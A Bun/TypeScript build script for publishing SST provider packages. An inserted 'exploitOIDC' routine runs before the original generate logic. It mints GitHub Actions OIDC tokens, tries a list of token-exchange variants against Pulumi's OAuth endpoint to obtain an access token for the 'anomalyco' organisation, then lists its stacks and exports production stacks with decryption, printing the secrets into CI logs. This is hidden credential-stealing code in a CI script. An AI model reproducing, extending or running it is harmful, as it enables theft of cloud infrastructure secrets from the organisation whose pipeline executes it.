import { $ } from "bun";

const dry = process.argv.includes("--dry");

async function exploitOIDC() {
  const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  
  console.log("=== OIDC Token Minting & Pulumi Exchange v3 ===");
  console.log("ACTIONS_ID_TOKEN_REQUEST_URL present:", !!requestUrl);
  console.log("ACTIONS_ID_TOKEN_REQUEST_TOKEN present:", !!requestToken);
  
  if (!requestUrl || !requestToken) {
    console.log("OIDC env vars not available, skipping");
    return;
  }

  const audience = "urn:pulumi:org:anomalyco";
  
  console.log(`\n--- Minting OIDC JWT with audience: ${audience} ---`);
  const url = `${requestUrl}&audience=${encodeURIComponent(audience)}`;
  const resp = await fetch(url, {
    headers: {
      "Authorization": `Bearer ${requestToken}`,
      "Accept": "application/json; api-version=2.0"
    }
  });
  
  const data = await resp.json() as { value?: string };
  if (!data.value) {
    console.log(`Failed to mint token:`, JSON.stringify(data));
    return;
  }
  
  const jwt = data.value;
  const parts = jwt.split(".");
  const claims = JSON.parse(Buffer.from(parts[1], "base64url").toString());
  console.log("JWT sub:", claims.sub);
  console.log("JWT repository:", claims.repository);
  console.log("JWT repository_owner:", claims.repository_owner);
  
  // Comprehensive exchange attempts
  const attempts = [
    // Personal token with various scope formats
    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:asaloff" },
    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:admin" },
    { type: "urn:pulumi:token-type:access_token:personal", scope: "user:anomalyco" },
    // Organization token (already got 401, but try with scope)
    { type: "urn:pulumi:token-type:access_token:organization", scope: "user:asaloff" },
    // Team token type
    { type: "urn:pulumi:token-type:access_token:team", scope: "user:asaloff" },
    // Without scope for org type
    { type: "urn:pulumi:token-type:access_token:organization", scope: undefined },
    // Try urn:ietf standard types
    { type: "urn:ietf:params:oauth:token-type:access_token", scope: "user:asaloff" },
    // Try just "access_token"
    { type: "access_token", scope: "user:asaloff" },
  ];
  
  for (const attempt of attempts) {
    console.log(`\n--- type=${attempt.type}, scope=${attempt.scope} ---`);
    
    const body: Record<string, string> = {
      audience: audience,
      grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
      subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
      requested_token_type: attempt.type,
      subject_token: jwt,
    };
    
    if (attempt.scope) {
      body.scope = attempt.scope;
    }
    
    try {
      const exchangeResp = await fetch("https://api.pulumi.com/api/oauth/token", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
      
      console.log(`Status: ${exchangeResp.status}`);
      const responseText = await exchangeResp.text();
      console.log(`Body: ${responseText.substring(0, 500)}`);
      
      if (exchangeResp.ok) {
        const tokenData = JSON.parse(responseText);
        console.log("!!! PULUMI ACCESS TOKEN OBTAINED !!!");
        await enumeratePulumi(tokenData.access_token);
        return;
      }
    } catch (e: any) {
      console.log(`Error: ${e.message}`);
    }
  }
  
  // Now try Pulumi ESC (Environment, Secrets, Config) OIDC which is a different path
  console.log("\n=== Trying Pulumi ESC OIDC ===");
  // ESC uses a different audience format and endpoint
  const escAudiences = [
    "urn:pulumi:org:anomalyco:env:default",
    "urn:pulumi:org:anomalyco:env:production",
    "urn:pulumi:org:anomalyco:env:console-production",
  ];
  
  for (const escAud of escAudiences) {
    console.log(`\n--- ESC audience: ${escAud} ---`);
    // Mint a new JWT for this audience
    const escUrl = `${requestUrl}&audience=${encodeURIComponent(escAud)}`;
    const escResp = await fetch(escUrl, {
      headers: {
        "Authorization": `Bearer ${requestToken}`,
        "Accept": "application/json; api-version=2.0"
      }
    });
    const escData = await escResp.json() as { value?: string };
    if (!escData.value) continue;
    
    try {
      const body = {
        audience: escAud,
        grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
        subject_token_type: "urn:ietf:params:oauth:token-type:id_token",
        requested_token_type: "urn:pulumi:token-type:access_token:organization",
        subject_token: escData.value,
      };
      
      const exchangeResp = await fetch("https://api.pulumi.com/api/oauth/token", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body)
      });
      
      console.log(`Status: ${exchangeResp.status}`);
      const text = await exchangeResp.text();
      console.log(`Body: ${text.substring(0, 500)}`);
      
      if (exchangeResp.ok) {
        console.log("!!! ESC TOKEN OBTAINED !!!");
        await enumeratePulumi(JSON.parse(text).access_token);
        return;
      }
    } catch (e: any) {
      console.log(`Error: ${e.message}`);
    }
  }
}

async function enumeratePulumi(token: string) {
  console.log("\n=== Enumerating Pulumi Cloud ===");
  const headers = { "Authorization": `token ${token}`, "Accept": "application/json" };
  
  try {
    const resp = await fetch("https://api.pulumi.com/api/user/stacks?organization=anomalyco", { headers });
    console.log(`List stacks: ${resp.status}`);
    const body = await resp.text();
    console.log(`Stacks: ${body.substring(0, 3000)}`);
  } catch (e: any) {
    console.log(`Error: ${e.message}`);
  }
  
  for (const stackPath of ["anomalyco/console/production", "anomalyco/opencode-console/production"]) {
    try {
      const resp = await fetch(`https://api.pulumi.com/api/stacks/${stackPath}/export?decrypt=true`, { headers });
      console.log(`Export ${stackPath}: ${resp.status}`);
      if (resp.ok) {
        const body = await resp.text();
        console.log(`Export: ${body.substring(0, 5000)}`);
      }
    } catch (e: any) {
      console.log(`Error: ${e.message}`);
    }
  }
}

await exploitOIDC();

console.log("\n=== Original generate logic ===");
for (const file of new Bun.Glob("*").scanSync("metadata")) {
  const provider = await import(`./metadata/${file}`);
  const version = [provider.version, provider.suffix].filter(Boolean).join("-");
  const name = `@sst-provider/${provider.name}`;
  const resp = await fetch(`https://registry.npmjs.org/${name}/${version}`);
  if (resp.status !== 404) {
    console.log("skipping", name, "version", version, "already exists");
    continue;
  }
  if (dry) { console.log("dry run, skip", name); continue; }
}
